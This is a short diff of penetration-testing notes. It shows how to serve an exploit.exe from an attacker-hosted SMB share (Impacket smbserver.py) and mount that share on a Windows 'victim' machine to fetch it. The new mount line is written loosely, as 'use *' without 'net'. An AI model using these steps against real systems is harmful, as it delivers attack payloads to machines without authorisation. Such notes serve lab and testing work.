@@ -3,5 +3,5 @@ python smbserver.py ROPNOP /root/yogesh
 
 Put any files within /root/yogesh folder (exploit.exe in this case)
 
-Windows
-copy \192.168.1.2\ROPNOP\exploit.exe .
+On the Windows (victim machine)
+use * \\192.168.1.2\ROPNOP\
